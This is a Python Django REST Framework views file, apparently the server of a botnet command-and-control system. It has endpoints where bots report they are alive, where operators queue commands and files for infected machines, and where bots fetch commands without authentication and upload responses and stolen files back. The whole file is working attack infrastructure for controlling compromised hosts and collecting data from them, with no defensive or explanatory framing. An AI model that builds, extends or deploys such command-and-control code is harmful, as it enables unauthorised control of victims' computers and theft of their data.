from rest_framework import viewsets, mixins, status
from rest_framework.response import Response
from rest_framework.decorators import action
from rest_framework.permissions import IsAuthenticated, AllowAny, IsAdminUser
from django.db.models import Q
from .models import *
from .pagenators import *
from .serializers import *
from django.http import QueryDict
import json

class BotNetViewSet(mixins.CreateModelMixin, mixins.ListModelMixin, viewsets.GenericViewSet):
    queryset = BotNet.objects.all()
    serializer_class = BotNetSerializer

    def create(self, request):
        ser = self.get_serializer(data=request.data)
        if ser.is_valid():
            ser.save().updated()
            return Response(
                ser.data
            )
        else:
            return Response(
                ser.errors
            )

    @action(detail=False, methods=['get'], name='Confirmation of bot survival')
    def survival(self, request):
        ser = self.get_serializer(data=request.GET)
        if ser.is_valid():
            obj = ser.get_instance(ser.validated_data.get('recipient')).updated()
            return Response(
                self.get_serializer(obj).data
            )
        else:
            return Response(
                ser.errors
            )


class CommandViewSet(mixins.CreateModelMixin, mixins.RetrieveModelMixin,
                    mixins.ListModelMixin, viewsets.GenericViewSet):
    queryset = Command.objects.all()
    serializer_class = CommandSerializer
    pagination_class = StandardResultsSetPagination
    status_400 = Response(
                {"detail": "要求の形式が正しくありません。"},
                status=status.HTTP_400_BAD_REQUEST
    )
    status_404 = Response(
                {"detail": "見つかりませんでした。"},
                status=status.HTTP_400_BAD_REQUEST
    )
    
    def conf_errors(self, ser, sers):
        errors = {}
        if not ser.is_valid():
            errors = ser.errors
        if not sers.is_valid():
            errors.update(sers.errors)
        return errors

    ''' アクションごとのパーミッション設定 '''
    def get_permissions(self):
        if self.action == 'bot_cmd' or self.action == 'partial_update':
            permission_classes = [AllowAny]
        else:
            permission_classes = [IsAuthenticated]

        return [permission() for permission in permission_classes]

    ''' コマンド作成(POST) '''
    def create(self, request):
        if type(request.data) is QueryDict:
            cmd_data = request.data.dict()
        else:
            cmd_data = request.data
        if 'cmd' in cmd_data and 'name' in cmd_data and 'content' in cmd_data:
            file_data = {
                'name': cmd_data['name'],
                'content': cmd_data['content']
            }
            del cmd_data['name']
            del cmd_data['content']
            cqd = QueryDict('',mutable=True)
            fqd = QueryDict('',mutable=True)
            cqd.update(cmd_data)
            fqd.update(file_data)
            c_ser = self.get_serializer(data=cqd)
            f_ser = UpFileSerializer(data=fqd)
            if c_ser.is_valid() and f_ser.is_valid():
                c_ser.save().connect_upfile(f_ser.save())
                return Response(
                    c_ser.data
                )
            else:
                return Response(
                    self.conf_errors(c_ser, f_ser)
                )
        else:
            serializer = self.get_serializer(data=request.data)
            if serializer.is_valid():
                serializer.save()
                return Response(
                    serializer.data
                )
            else:
                return Response(
                    serializer.errors
                )

    ''' レスポンス更新(PATCH) '''
    def partial_update(self, request, pk=None):
        try:
            command = Command.objects.get(pk=pk)
        except Command.DoesNotExist:
            return self.status_404
        if type(request.data) is QueryDict:
            cmd_data = request.data.dict()
        else:
            cmd_data = request.data
        
        if 'response' in cmd_data and 'name' in cmd_data and 'content' in cmd_data:
            file_data = {
                'name': cmd_data['name'],
                'content': cmd_data['content']
            }
            del cmd_data['name']
            del cmd_data['content']
            cqd = QueryDict('',mutable=True)
            fqd = QueryDict('',mutable=True)
            cqd.update(cmd_data)
            fqd.update(file_data)
            c_ser = CommandUpdateSerializer(command, data=cqd, partial=True)
            f_ser = DownFileSerializer(data=fqd)
            if c_ser.is_valid() and f_ser.is_valid():
                c_ser.save().connect_downfile(f_ser.save())
                return Response(
                    c_ser.data
                )
            else:
                return Response(
                    self.conf_errors(c_ser, f_ser)
                )
        elif 'response' in cmd_data:
            serializer = CommandUpdateSerializer(command, data=request.data, partial=True)
            if serializer.is_valid():
                serializer.save()
                return Response(
                    serializer.data
                )
            else:
                return Response(
                    serializer.errors
                )
        else:
            return self.status_400

    ''' 感染者宛て(GET) '''
    @action(detail=False, methods=['get'], name='Message to the bot')
    def bot_cmd(self, request):
        ser = RecipientSerializer(data=request.GET)
        if ser.is_valid():
            page = self.paginate_queryset(
                Command.objects.filter(
                Q(recipient=ser.validated_data.get('recipient')) | 
                Q(recipient='ALL')
            ))
            c_ser = self.get_serializer(page, many=True)
            return self.get_paginated_response(
                c_ser.data
            )
        else:
            return Response(
                ser.errors
            )


    ''' 送信者宛て(GET) '''
    @action(detail=False, methods=['get'], name='Message to the sender')
    def sender_cmd(self, request):
        ser = SenderSerializer(data=request.GET)
        if ser.is_valid():
            print(ser.data)
            page = self.paginate_queryset(
                Command.objects.filter(
                sender=ser.validated_data.get('sender')
            ))
            c_ser = self.get_serializer(page, many=True)
            return self.get_paginated_response(
                c_ser.data
            )
        else:
            return Response(
                ser.errors
            )